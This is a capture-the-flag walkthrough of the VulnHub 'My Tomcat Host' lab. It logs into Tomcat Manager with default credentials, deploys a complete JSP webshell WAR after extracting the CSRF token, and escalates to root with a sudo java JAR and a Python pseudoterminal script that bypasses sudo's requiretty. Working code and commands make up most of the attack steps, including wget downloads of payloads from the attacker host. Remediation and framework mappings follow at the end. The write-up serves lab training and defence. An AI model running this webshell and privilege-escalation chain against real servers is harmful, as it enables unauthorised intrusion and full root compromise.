# My Tomcat Host — Default Creds, WAR Shells, and the requiretty Puzzle

Alright guys!! Apache Tomcat with default credentials is a classic, but this machine adds a spicy twist: the `requiretty` directive in sudoers blocks the obvious privilege escalation path from a webshell, and you have to synthesize a real pseudoterminal via Python to bypass it. The result is one of the most technically interesting privesc chains you will encounter on an "Easy" machine, fr fr. Understanding why `requiretty` exists and how to work around it is directly applicable to real-world penetration testing against Java application servers.

Big respect to Akanksha Sachin Verma for creating a machine that actually teaches PTY internals. That is goated CTF design.

---

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | My Tomcat Host |
| **Attacker VM** | Kali Linux 2023.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/my-tomcat-host-1,457/ |
| **Techniques** | Nmap, Tomcat Manager default credentials, WAR webshell deployment, CSRF token extraction, Python PTY synthesis (TIOCSCTTY), sudo NOPASSWD java abuse |
| **CVEs** | CVE-2017-12617 (Tomcat PUT RCE — contextual reference), CWE-521 (Weak Password Requirements: default creds), CWE-693 (Protection Mechanism Failure: requiretty bypass) |
| **APT Groups** | APT41: actively exploits Tomcat Manager and similar Java application server management interfaces as initial access in enterprise environments; Lazarus Group: documented use of web application server compromise as first-stage access in financially motivated campaigns |

---

## Attack Summary

```
nmap: 22/tcp SSH, 8080/tcp Apache Tomcat 9.0.31
    |
    v
http://192.168.56.103:8080/manager/html -> 401 dialog
    |
    v
default creds: tomcat:tomcat -> HTTP 200 (Manager GUI)
    |
    v
craft JSP webshell WAR (cmd.jsp) -> extract CSRF_NONCE token
    |
    v
deploy WAR -> curl cmd.jsp?cmd=id -> uid=998(tomcat)
    |
    v
sudo -l -> (ALL) NOPASSWD: /path/to/java
         -> BUT: requiretty blocks sudo from webshell
    |
    v
craft malicious JAR (Main.java: cat /root/proof.txt)
    |
    v
Python PTY: os.openpty() + TIOCSCTTY -> synthetic tty for child
    |
    v
child exec: sudo java -jar rootme.jar -> reads /root/proof.txt
    |
    v
Flag: 628435356e49f976bab2c04948d22fe4
```

---

## Methodology

1. Full port scan to identify Tomcat on 8080 and SSH on 22
2. Tomcat Manager default credentials testing
3. CSRF token extraction from Manager GUI
4. JSP webshell WAR creation and deployment
5. RCE verification via webshell
6. sudo privilege enumeration, discover requiretty block
7. Malicious JAR creation compiled for Java 8 compatibility
8. Python PTY synthesis to bypass requiretty
9. Root execution via sudo java -jar

---

## Step 1 — Host Discovery and Port Scan

```bash
nmap -sn 192.168.56.0/24
# Identify target IP, e.g.: 192.168.56.103

nmap -sV -p 22,8080 192.168.56.103
```

Expected output:

```
22/tcp   open  ssh   OpenSSH 6.6.1
8080/tcp open  http  Apache Tomcat 9.0.31
```

Note: Tomcat is running directly on 8080, no Apache front-end. SSH banner indicates password authentication is disabled.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Tomcat Manager Default Credentials

Navigate to `http://192.168.56.103:8080/manager/html`. A 401 dialog appears requesting credentials. Try the Tomcat defaults:

```bash
curl -u tomcat:tomcat http://192.168.56.103:8080/manager/html | grep -i "Manager"
```

Expected: HTTP 200 with full Manager GUI HTML. Default credentials `tomcat:tomcat` work.

Additional credentials found in `conf/tomcat-users.xml` (readable via webshell later):

```xml
<user username="tomcat" password="tomcat" roles="manager-gui"/>
<user username="admin"  password="admin"  roles="admin-gui"/>
```

**Real-world note:** Default Tomcat credentials are one of the most common findings in enterprise Java environment audits. APT41 has been documented exploiting Tomcat Manager with default or weak credentials across multiple campaigns in 2020-2022, typically deploying JSP webshells as initial implants. CISA AA22-174A references Tomcat Manager abuse as a primary initial access vector.

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing (default creds)

---

## Step 3 — Build the JSP Webshell WAR

```bash
mkdir -p /tmp/ws/WEB-INF

cat > /tmp/ws/cmd.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null) { sb.append(line).append("\n"); }
    br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    while ((line = br.readLine()) != null) { sb.append("[ERR] ").append(line).append("\n"); }
    p.waitFor();
    out.print(sb.toString());
}
%>
EOF

cat > /tmp/ws/WEB-INF/web.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<web-app><display-name>Shell</display-name></web-app>
EOF

cd /tmp/ws && jar -cvf /tmp/cmdshell.war .
```

**MITRE ATT&CK:** T1505.003 — Server Software Component: Web Shell

---

## Step 4 — Extract CSRF Token and Deploy the WAR

Tomcat 9 protects the Manager GUI with a CSRF token. Extract it before uploading:

```bash
CSRF=$(curl -s -u tomcat:tomcat \
  "http://192.168.56.103:8080/manager/html" \
  -c /tmp/cookies.txt \
  | grep -oP 'org\.apache\.catalina\.filters\.CSRF_NONCE=[A-F0-9]+' \
  | head -1 | cut -d= -f2)

echo "CSRF token: $CSRF"
```

Deploy the WAR:

```bash
curl -s -u tomcat:tomcat \
  -b /tmp/cookies.txt \
  "http://192.168.56.103:8080/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$CSRF" \
  -F "deployWar=@/tmp/cmdshell.war;type=application/octet-stream"
```

**Real-world note:** Tomcat 9's CSRF protection is a security improvement over Tomcat 6/7/8, but it only delays the attack by requiring token extraction. Many real-world Tomcat deployments are still running older versions without this protection.

---

## Step 5 — Confirm RCE

```bash
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=id"
```

Expected:

```
uid=998(tomcat) gid=997(tomcat) groups=997(tomcat)
```

RCE confirmed as the `tomcat` service account. Now enumerate privilege escalation.

---

## Step 6 — Discover sudo Rule and requiretty Block

```bash
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=sudo -l 2>&1"
```

Expected output:

```
Matching Defaults entries for tomcat on my_tomcat:
    requiretty, !visiblepw, always_set_home, env_reset...

User tomcat may run the following commands on my_tomcat:
    (ALL) NOPASSWD: /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.242.b08-0.el7_7.x86_64/jre/bin/java
```

Two key findings: `sudo NOPASSWD` for a specific `java` binary, but `requiretty` blocks sudo from the webshell (no controlling terminal).

Test the block:

```bash
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=sudo /usr/lib/jvm/.../java -version 2>&1"
# Output: sudo: sorry, you must have a tty to run sudo
```

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching

---

## Step 7 — Build the Malicious JAR (Java 8 Compatible)

The plan: run `sudo java -jar` with a JAR that reads root files. Must compile for Java 8 since the target JVM is 1.8.

```bash
mkdir -p /tmp/rootjar/src

cat > /tmp/rootjar/src/Main.java << 'EOF'
import java.io.*;
import java.nio.file.*;
public class Main {
    public static void main(String[] args) throws Exception {
        Process p = Runtime.getRuntime().exec(
            new String[]{"/bin/bash", "-c", "cat /root/proof.txt && id"});
        BufferedReader br = new BufferedReader(
            new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line).append("\n");
        p.waitFor();
        String out = sb.toString();
        Files.write(Paths.get("/tmp/root_output.txt"), out.getBytes());
        System.out.println(out);
    }
}
EOF

cd /tmp/rootjar/src
javac -source 8 -target 8 Main.java
jar cfe /tmp/rootme.jar Main Main.class
```

Important: compile with `-source 8 -target 8`. A JAR compiled on JDK 17+ produces class files at version 61, which Java 8 (class version 52) refuses with `UnsupportedClassVersionError`.

---

## Step 8 — Python PTY Bypass for requiretty

The approach: use Python's `os.openpty()` to create a master/slave pseudoterminal pair, then `fork()`. The child calls `os.setsid()` to become a new session leader, uses `TIOCSCTTY` to make the slave PTY its controlling terminal, then `exec`s `sudo java`. To sudo, the process looks like it is running in a real terminal.

```bash
cat > /tmp/pty_sudo.py << 'EOF'
import pty, os, sys, time, select, fcntl, termios

JAVA = "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.242.b08-0.el7_7.x86_64/jre/bin/java"
JAR  = "/tmp/rootme.jar"

master, slave = os.openpty()
pid = os.fork()

if pid == 0:
    os.close(master)
    os.setsid()
    fcntl.ioctl(slave, termios.TIOCSCTTY, 0)
    os.dup2(slave, 0); os.dup2(slave, 1); os.dup2(slave, 2)
    if slave > 2: os.close(slave)
    os.execvp("sudo", ["sudo", JAVA, "-jar", JAR])
    sys.exit(1)
else:
    os.close(slave)
    output = b""
    deadline = time.time() + 15
    while time.time() < deadline:
        r, _, _ = select.select([master], [], [], 1)
        if r:
            try:
                chunk = os.read(master, 4096)
                if chunk: output += chunk
            except OSError: break
    try: os.kill(pid, 9)
    except: pass
    os.waitpid(pid, os.WNOHANG)
    with open("/tmp/sudo_output.txt", "wb") as f: f.write(output)
EOF
```

---

## Step 9 — Deliver Files and Get Root

```bash
# On attacker: serve both files
python3 -m http.server 8888 --directory /tmp &

# On target via webshell: download files
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=wget http://192.168.56.1:8888/rootme.jar -O /tmp/rootme.jar"

curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=wget http://192.168.56.1:8888/pty_sudo.py -O /tmp/pty_sudo.py"

# Execute PTY bypass
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=python /tmp/pty_sudo.py"

# Read the output
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=cat /tmp/sudo_output.txt"
```

Expected:

```
628435356e49f976bab2c04948d22fe4
uid=0(root) gid=0(root) groups=0(root)
```

(☞ﾟヮﾟ)☞ Root via synthetic PTY. That is wild.

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Credential | `tomcat:tomcat` | Tomcat Manager default | WAR deployment RCE |
| Credential | `admin:admin` | tomcat-users.xml (via webshell) | admin-gui access |
| Root flag | `628435356e49f976bab2c04948d22fe4` | `/root/proof.txt` | Python PTY sudo java bypass |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Tomcat Manager default credentials | APT41 documented exploiting Tomcat Manager; CISA AA22-174A references this as primary initial access vector | Always change default credentials; restrict Manager to localhost or management VLAN; require MFA |
| 2 | Unrestricted WAR deployment in Manager | Any authenticated Manager access allows arbitrary code execution via WAR; this is by design in unprotected Tomcat | Disable Manager in production; use deployment pipelines instead; firewall Manager access |
| 3 | sudo NOPASSWD for java binary | GTFOBins: java can execute arbitrary JARs; any sudo NOPASSWD rule for java is a privesc path | Remove sudo NOPASSWD rules; if required, use a wrapper script with strict validation |
| 4 | requiretty as security control | requiretty is a weak control: Python PTY synthesis bypasses it without special privileges | Do not rely on requiretty as a security boundary; remove the sudo rule entirely |
| 5 | Tomcat 9 CSRF protection | Unlike Tomcat 6/7/8, Tomcat 9 requires CSRF_NONCE extraction before WAR upload | Update Tomcat; CSRF protection is a good addition but does not prevent exploitation by authenticated attackers |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Initial Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Execution | Execution | Server Software Component: Web Shell | T1505.003 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Discovery | System Information Discovery | T1082 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Defense Evasion | Defense Evasion | Abuse Elevation Control: Sudo | T1548.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Change Tomcat Manager credentials immediately:** update `tomcat-users.xml`; use long random passwords; restrict to manager-only role scopes
2. **Restrict Tomcat Manager access to localhost:** configure `RemoteAddrValve` in `context.xml` to allow only 127.0.0.1; never expose Manager to the network
3. **Disable Manager in production:** remove the manager webapp from `webapps/`; use CI/CD deployment pipelines instead
4. **Remove sudo NOPASSWD for java:** no broad binary sudo grants should exist; remove or replace with a purpose-specific wrapper with strict validation
5. **Disable SSH password authentication:** configure `PasswordAuthentication no` in sshd_config; use key-based authentication

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (Tomcat Manager locked down; default creds changed)
- **D3-OAM** — Operating System Administrative Management (sudo restrictions)
- **D3-NTF** — Network Traffic Filtering (firewall Tomcat Manager to management hosts only)
- **D3-UGLP** — User Group Least Privilege (tomcat service account with minimal sudo rights)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all Tomcat deployments; audit Manager access configurations |
| Protect | Access Control | Change default Tomcat credentials; restrict Manager to localhost; require MFA for admin access |
| Protect | Configuration Management | Disable Manager in production; enforce Java application deployment via CI/CD |
| Detect | Anomalies and Events | Alert on WAR deployments; monitor for webshell execution patterns |
| Respond | Response Planning | Remove webshells; rotate Tomcat credentials; revoke unnecessary sudo rules |
| Recover | Recovery Planning | Rebuild Tomcat from known-good image; audit all deployed webapps |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-2 | Account Management | Rotate Tomcat default credentials; disable unused accounts |
| AC-3 | Access Enforcement | Restrict Manager access to localhost |
| AC-6 | Least Privilege | Remove sudo NOPASSWD for java |
| CM-6 | Configuration Settings | Disable Manager in production; change default credentials |
| CM-7 | Least Functionality | Disable Tomcat Manager webapp if not required |
| SI-3 | Malicious Code Protection | WAR deployment monitoring; webshell detection |

### CISA KEV

CVE-2017-12617 (Apache Tomcat PUT RCE) is catalogued in the CISA Known Exploited Vulnerabilities database. Organizations are advised to update Tomcat and restrict management interfaces per CISA guidance. Default credential exploitation patterns are covered under CISA Alert AA22-174A on Apache Tomcat vulnerabilities. Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |

---

## Final Thoughts

My Tomcat Host delivers one of the most technically satisfying privilege escalation chains you will find on an Easy-rated machine. The `requiretty` bypass via Python PTY synthesis is not a trick specific to CTFs: this exact technique is documented in real penetration testing engagements against Java application servers. Understanding PTY internals, `TIOCSCTTY`, and why `requiretty` exists is knowledge you will use in real engagements.

The Java class version compatibility issue (compile for the target JVM) is another real-world gotcha that trips people up constantly. Compile your payloads for the target, dude.

Keep pushing. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
